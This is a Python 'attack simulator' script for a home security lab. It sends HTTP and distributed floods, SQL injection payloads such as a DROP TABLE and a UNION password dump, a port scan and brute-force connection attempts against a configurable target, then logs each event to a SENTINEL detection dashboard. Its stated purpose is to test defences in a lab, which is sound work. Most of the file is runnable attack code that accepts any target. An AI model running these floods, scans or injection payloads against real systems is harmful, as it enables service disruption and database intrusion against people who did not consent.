"""
SENTINEL Attack Simulator
=========================
Educational / Lab use only. Run this from an attacker VM (Kali Linux)
or from the host machine against a local lab target.

Network architecture assumed:
  Public/WAN  : 10.0.0.0/24   (attacker VMs: 10.0.0.10-19)
  DMZ         : 192.168.50.0/24 (web server: .10, SENTINEL: .20)
  Internal LAN: 192.168.100.0/24 (analyst: .10)
  pfSense WAN : 10.0.0.1
  pfSense DMZ : 192.168.50.1
  pfSense LAN : 192.168.100.1

Usage:
  python attack_sim.py dos        [target_ip] [port] [duration_sec]
  python attack_sim.py ddos       [target_ip] [port] [num_attackers] [duration_sec]
  python attack_sim.py sqli       [target_url]
  python attack_sim.py portscan   [target_ip]
  python attack_sim.py bruteforce [target_ip] [port]
  python attack_sim.py all        [target_ip]

All attacks are logged to SENTINEL via POST /api/attack/ingest.
"""

import socket
import threading
import time
import random
import sys
import json
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

SENTINEL_URL = "http://localhost:8000"

# Default lab targets
DEFAULT_TARGET = "192.168.50.10"
DEFAULT_PORT   = 80

# Simulated attacker IPs (public zone)
ATTACKER_POOL = [f"10.0.0.{i}" for i in range(10, 20)]

# SQL injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "' UNION SELECT username,password FROM users --",
    "1; SELECT * FROM information_schema.tables --",
    "admin'--",
    "' OR 'x'='x",
    "1' AND SLEEP(5) --",
    "' OR 1=1 LIMIT 1 --",
    "' AND 1=2 UNION SELECT NULL,NULL --",
]


# ── Helpers ───────────────────────────────────────────────────────────────────

def _log(msg: str):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


def _sentinel_ingest(event_type, src_ip, dst_ip, dst_port, zone_src, zone_dst,
                     protocol, packets, action, rule):
    """Push event to SENTINEL dashboard."""
    if not HAS_REQUESTS:
        return
    try:
        requests.post(
            f"{SENTINEL_URL}/api/attack/ingest",
            json={
                "event_type":    event_type,
                "src_ip":        src_ip,
                "dst_ip":        dst_ip,
                "dst_port":      dst_port,
                "zone_src":      zone_src,
                "zone_dst":      zone_dst,
                "protocol":      protocol,
                "packets_count": packets,
                "action":        action,
                "rule_matched":  rule,
                "raw_log":       (
                    f"SIM {event_type.upper()} {src_ip} -> {dst_ip}:{dst_port} "
                    f"pkts={packets} proto={protocol} rule={rule}"
                ),
            },
            timeout=3,
        )
    except Exception:
        pass


def _tcp_connect(host: str, port: int, payload: bytes = b"", timeout: float = 0.5) -> bool:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((host, port))
            if payload:
                s.sendall(payload)
            return True
    except Exception:
        return False


# ── 1. DoS — HTTP Flood ───────────────────────────────────────────────────────

def simulate_dos(target_ip: str, port: int = 80, duration: int = 10):
    """
    Single-source HTTP flood (Denial of Service).
    Sends repeated HTTP GET requests as fast as possible.
    pfSense rule triggered: BLOCK_DOS_FLOOD (rate-limit > 100 req/s per IP)
    """
    _log(f"[DoS] Starting HTTP flood -> {target_ip}:{port} for {duration}s")
    src_ip  = ATTACKER_POOL[0]
    payload = (
        f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n"
        f"Connection: keep-alive\r\nX-Sim: dos\r\n\r\n"
    ).encode() * 10

    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        if _tcp_connect(target_ip, port, payload):
            count += 1

    _sentinel_ingest("dos", src_ip, target_ip, port,
                     "public", "dmz", "TCP", count,
                     "blocked", "BLOCK_DOS_FLOOD")
    _log(f"[DoS] Done. {count} requests sent. Event pushed to SENTINEL.")


# ── 2. DDoS — Distributed HTTP Flood ─────────────────────────────────────────

def simulate_ddos(target_ip: str, port: int = 80,
                  num_attackers: int = 5, duration: int = 10):
    """
    Multi-source distributed flood (DDoS).
    Each thread simulates a separate attacker IP from the public zone.
    pfSense rule triggered: BLOCK_DDOS_RATE_LIMIT (aggregate > 500 req/s)
    """
    _log(f"[DDoS] Launching {num_attackers} attackers -> {target_ip}:{port}")
    attacker_ips = random.sample(ATTACKER_POOL, min(num_attackers, len(ATTACKER_POOL)))
    counts = {ip: 0 for ip in attacker_ips}
    lock   = threading.Lock()

    def attacker(src_ip: str):
        payload = (
            f"GET /?flood={random.randint(1000,9999)} HTTP/1.0\r\n"
            f"Host: {target_ip}\r\n\r\n"
        ).encode()
        end = time.time() + duration
        while time.time() < end:
            if _tcp_connect(target_ip, port, payload, timeout=0.3):
                with lock:
                    counts[src_ip] += 1

    threads = [threading.Thread(target=attacker, args=(ip,), daemon=True)
               for ip in attacker_ips]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    total = sum(counts.values())
    for ip, pkt in counts.items():
        _sentinel_ingest("ddos", ip, target_ip, port,
                         "public", "dmz", "TCP", pkt,
                         "blocked", "BLOCK_DDOS_RATE_LIMIT")

    _log(f"[DDoS] Done. {total} total requests across {num_attackers} sources. Logged to SENTINEL.")


# ── 3. SQL Injection ──────────────────────────────────────────────────────────

def simulate_sqli(target_url: str):
    """
    SQL injection payload flood against a web endpoint.
    Sends each payload as a GET query param and as POST body.
    pfSense/WAF rule triggered: BLOCK_SQLI_WAF
    """
    if not HAS_REQUESTS:
        _log("[SQLi] 'requests' library not installed. Run: pip install requests")
        return

    host   = target_url.split("/")[2].split(":")[0]
    port   = int(target_url.split(":")[2].split("/")[0]) if ":" in target_url.split("/")[2] else 80
    src_ip = ATTACKER_POOL[5]

    _log(f"[SQLi] Testing {len(SQLI_PAYLOADS)} payloads against {target_url}")
    blocked = 0
    for i, payload in enumerate(SQLI_PAYLOADS, 1):
        try:
            # GET injection
            requests.get(target_url, params={"id": payload, "search": payload},
                         timeout=2, allow_redirects=False)
            # POST injection
            requests.post(target_url,
                          data={"username": payload, "password": payload},
                          timeout=2, allow_redirects=False)
        except Exception:
            blocked += 1
        _log(f"  [{i}/{len(SQLI_PAYLOADS)}] {payload[:50]}")
        time.sleep(0.15)

    _sentinel_ingest("sql_injection", src_ip, host, port,
                     "public", "dmz", "TCP", len(SQLI_PAYLOADS),
                     "blocked", "BLOCK_SQLI_WAF")
    _log(f"[SQLi] Done. {len(SQLI_PAYLOADS)} payloads sent ({blocked} connection errors). Logged.")


# ── 4. Port Scan ──────────────────────────────────────────────────────────────

def simulate_port_scan(target_ip: str, port_range: tuple = (1, 1025)):
    """
    TCP connect scan across a port range.
    pfSense detects via threshold: > 50 distinct ports in < 5s from one IP.
    """
    src_ip     = ATTACKER_POOL[2]
    open_ports = []

    _log(f"[PortScan] Scanning {target_ip} ports {port_range[0]}-{port_range[1]-1}")
    for port in range(port_range[0], port_range[1]):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.08)
                if s.connect_ex((target_ip, port)) == 0:
                    open_ports.append(port)
        except Exception:
            pass

    _sentinel_ingest("port_scan", src_ip, target_ip, 0,
                     "public", "dmz", "TCP",
                     port_range[1] - port_range[0],
                     "detected", "DETECT_PORT_SCAN")
    _log(f"[PortScan] Done. Open ports: {open_ports or 'none'}. Logged to SENTINEL.")
    return open_ports


# ── 5. Brute Force ────────────────────────────────────────────────────────────

def simulate_bruteforce(target_ip: str, port: int = 22, attempts: int = 50):
    """
    Rapid TCP connection attempts simulating credential brute-force (SSH/FTP/RDP).
    pfSense rule triggered: BLOCK_SSH_BRUTE (> 10 connections/s per IP)
    """
    src_ip  = ATTACKER_POOL[3]
    success = 0
    _log(f"[BruteForce] {attempts} attempts against {target_ip}:{port}")

    for i in range(attempts):
        if _tcp_connect(target_ip, port, b"USER admin\r\nPASS " +
                        f"pass{i:04d}\r\n".encode(), timeout=0.3):
            success += 1

    _sentinel_ingest("brute_force", src_ip, target_ip, port,
                     "public", "dmz", "TCP", attempts,
                     "blocked", "BLOCK_SSH_BRUTE")
    _log(f"[BruteForce] Done. {attempts} attempts, {success} connections made. Logged.")


# ── 6. Full attack chain ──────────────────────────────────────────────────────

def simulate_all(target_ip: str):
    _log("=" * 55)
    _log("SENTINEL Full Attack Chain Simulation")
    _log(f"Target: {target_ip}")
    _log("=" * 55)

    _log("\n[Phase 1] Reconnaissance — Port Scan")
    simulate_port_scan(target_ip, (1, 512))
    time.sleep(1)

    _log("\n[Phase 2] Exploitation — SQL Injection")
    simulate_sqli(f"http://{target_ip}/dvwa/vulnerabilities/sqli/")
    time.sleep(1)

    _log("\n[Phase 3] Credential Attack — Brute Force SSH")
    simulate_bruteforce(target_ip, port=22, attempts=30)
    time.sleep(1)

    _log("\n[Phase 4] Disruption — DoS HTTP Flood")
    simulate_dos(target_ip, port=80, duration=6)
    time.sleep(1)

    _log("\n[Phase 5] Disruption — DDoS (5 sources)")
    simulate_ddos(target_ip, port=80, num_attackers=5, duration=6)

    _log("\n[Done] Full attack chain complete. Check SENTINEL Network tab.")


# ── CLI entry point ───────────────────────────────────────────────────────────

USAGE = """
Usage:
  python attack_sim.py dos        [target] [port=80]   [duration=10]
  python attack_sim.py ddos       [target] [port=80]   [attackers=5] [duration=10]
  python attack_sim.py sqli       [target_url]
  python attack_sim.py portscan   [target] [start=1]   [end=1025]
  python attack_sim.py bruteforce [target] [port=22]   [attempts=50]
  python attack_sim.py all        [target]

Default target: 192.168.50.10 (DMZ web server)
SENTINEL URL  : http://localhost:8000
"""

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(USAGE)
        sys.exit(1)

    mode   = sys.argv[1].lower()
    target = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_TARGET

    if mode == "dos":
        port     = int(sys.argv[3]) if len(sys.argv) > 3 else DEFAULT_PORT
        duration = int(sys.argv[4]) if len(sys.argv) > 4 else 10
        simulate_dos(target, port, duration)

    elif mode == "ddos":
        port      = int(sys.argv[3]) if len(sys.argv) > 3 else DEFAULT_PORT
        attackers = int(sys.argv[4]) if len(sys.argv) > 4 else 5
        duration  = int(sys.argv[5]) if len(sys.argv) > 5 else 10
        simulate_ddos(target, port, attackers, duration)

    elif mode == "sqli":
        url = target if target.startswith("http") else f"http://{target}/"
        simulate_sqli(url)

    elif mode == "portscan":
        start = int(sys.argv[3]) if len(sys.argv) > 3 else 1
        end   = int(sys.argv[4]) if len(sys.argv) > 4 else 1025
        simulate_port_scan(target, (start, end))

    elif mode == "bruteforce":
        port     = int(sys.argv[3]) if len(sys.argv) > 3 else 22
        attempts = int(sys.argv[4]) if len(sys.argv) > 4 else 50
        simulate_bruteforce(target, port, attempts)

    elif mode == "all":
        simulate_all(target)

    else:
        print(f"Unknown mode: {mode}")
        print(USAGE)
        sys.exit(1)
